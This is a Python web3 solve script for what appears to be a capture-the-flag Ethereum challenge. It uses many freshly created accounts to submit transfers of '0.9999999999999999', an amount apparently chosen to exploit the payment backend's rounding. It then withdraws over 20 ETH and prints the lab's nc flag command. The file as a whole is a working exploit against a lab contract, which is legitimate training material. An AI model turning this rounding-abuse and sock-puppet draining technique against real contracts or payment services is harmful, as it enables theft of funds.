import os
import time
from decimal import Decimal
from web3 import Web3
from eth_account import Account

# add definition
Local_Ethereum_Endpoint = os.getenv('RPC', 'http://10.83.1.106:8545/b4d10b83-8075-49f9-82c2-2023e46efe7d')
private_key = os.getenv('PRIVATE_KEY', '0x546f2e5c4f9289c9a84ab6b2757bd747aae4efa083201105989f3afa716e4374')
setup_address = os.getenv('SETUP_ADDRESS', '0xD41f19Ba13C4B99a6d4A2e6Ffff1C462E5f521cA')
amount = '0.9999999999999999'
amount_wei = int(float(amount) * 10**18)
target_wei = Web3.to_wei(21, 'ether')
fund_wei = Web3.to_wei(Decimal('0.003'), 'ether')

w3 = Web3(Web3.HTTPProvider(Local_Ethereum_Endpoint, request_kwargs={'timeout': 12}))
owner = Account.from_key(private_key)

setup_abi = [
    {'inputs': [], 'name': 'TARGET', 'outputs': [{'type': 'address'}], 'stateMutability': 'view', 'type': 'function'},
    {'inputs': [], 'name': 'isSolved', 'outputs': [{'type': 'bool'}], 'stateMutability': 'view', 'type': 'function'}
]
chal_abi = [
    {'inputs': [{'type': 'address'}, {'type': 'string'}], 'name': 'transfer', 'outputs': [{'type': 'uint256'}], 'stateMutability': 'nonpayable', 'type': 'function'},
    {'inputs': [], 'name': 'nextTransferId', 'outputs': [{'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'},
    {'inputs': [{'type': 'uint256'}], 'name': 'transfers', 'outputs': [{'type': 'address'}, {'type': 'address'}, {'type': 'string'}, {'type': 'bool'}], 'stateMutability': 'view', 'type': 'function'},
    {'inputs': [{'type': 'address'}], 'name': 'balanceOf', 'outputs': [{'type': 'int256'}], 'stateMutability': 'view', 'type': 'function'},
    {'inputs': [{'type': 'uint256'}], 'name': 'withdraw', 'outputs': [], 'stateMutability': 'nonpayable', 'type': 'function'},
    {'inputs': [], 'name': 'getBalance', 'outputs': [{'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'}
]

# retry RPC requests when the server disconnects
def retry(func):
    for i in range(12):
        try:
            return func()
        except Exception as error:
            if i == 11:
                raise
            print('RPC error:', str(error)[:100])
            time.sleep(min(2 ** i, 15))

# send a transaction
# use the same signed transaction when RPC connection fails
def send(account, tx):
    tx['from'] = account.address
    tx['nonce'] = retry(lambda: w3.eth.get_transaction_count(account.address, 'pending'))
    tx['chainId'] = retry(lambda: w3.eth.chain_id)
    tx['gasPrice'] = retry(lambda: w3.eth.gas_price)
    if 'gas' not in tx:
        tx['gas'] = 200000
    signed = account.sign_transaction(tx)
    raw = signed.raw_transaction
    tx_hash = Web3.keccak(raw)

    for i in range(15):
        try:
            receipt = w3.eth.get_transaction_receipt(tx_hash)
            if receipt.status != 1:
                raise RuntimeError('Transaction failed: ' + tx_hash.hex())
            return tx_hash.hex()
        except Exception as error:
            if 'Transaction failed:' in str(error):
                raise
        try:
            w3.eth.send_raw_transaction(raw)
        except Exception as error:
            print('send:', str(error)[:100])
        try:
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=12)
            if receipt.status != 1:
                raise RuntimeError('Transaction failed: ' + tx_hash.hex())
            return tx_hash.hex()
        except Exception as error:
            if 'Transaction failed:' in str(error):
                raise
            print('waiting:', str(error)[:100])
            time.sleep(2)
    raise RuntimeError('Check transaction before running again: ' + tx_hash.hex())

setup = w3.eth.contract(address=Web3.to_checksum_address(setup_address), abi=setup_abi)
chal_address = retry(lambda: setup.functions.TARGET().call())
chal = w3.eth.contract(address=chal_address, abi=chal_abi)

print('Chain ID:', retry(lambda: w3.eth.chain_id))
print('Owner:', owner.address)
print('Chal:', chal.address)

# count requests already sent, so we can restart the script
# without submitting the same amount again
def check_state():
    count = retry(lambda: chal.functions.nextTransferId().call())
    pending = 0
    processed = 0
    for i in range(count):
        sender, receiver, value, done = retry(lambda i=i: chal.functions.transfers(i).call())
        if receiver.lower() == owner.address.lower() and value == amount:
            if done:
                processed += 1
            else:
                pending += 1
    balance = retry(lambda: chal.functions.balanceOf(owner.address).call())
    return balance, pending, processed

if retry(lambda: setup.functions.isSolved().call()):
    print('Already solved! Select option 3 in nc.')
else:
    contract_balance = retry(lambda: chal.functions.getBalance().call())
    withdrawn = Web3.to_wei(100, 'ether') - contract_balance
    balance, pending, processed = check_state()
    print('Contract balance:', w3.from_wei(contract_balance, 'ether'))
    print('My balance:', w3.from_wei(balance, 'ether'))
    print('Pending:', pending, 'Processed:', processed)

    # make enough transfers to withdraw over 20 ETH
    need = max(0, (target_wei - withdrawn - balance - pending * amount_wei + amount_wei - 1) // amount_wei)
    print('New transfers:', need)

    for i in range(need):
        child = Account.create()
        send(owner, {'to': child.address, 'value': fund_wei, 'gas': 21000})
        tx = chal.functions.transfer(owner.address, amount).build_transaction({'from': child.address, 'gas': 200000})
        send(child, tx)
        print(i + 1, '/', need, child.address)

    # wait for payment backend
    end_time = time.monotonic() + 300
    while time.monotonic() < end_time:
        balance, pending, processed = check_state()
        print('Balance:', w3.from_wei(balance, 'ether'), 'Pending:', pending)
        if pending == 0:
            break
        time.sleep(4)

    # withdraw money
    if balance > 0:
        tx = chal.functions.withdraw(balance).build_transaction({'from': owner.address, 'gas': 150000})
        print('Withdraw tx:', send(owner, tx))

    if retry(lambda: setup.functions.isSolved().call()):
        print('SOLVED! nc 10.83.1.106 31337 -> option 3')
    else:
        print('Not solved yet. Run again to continue.')
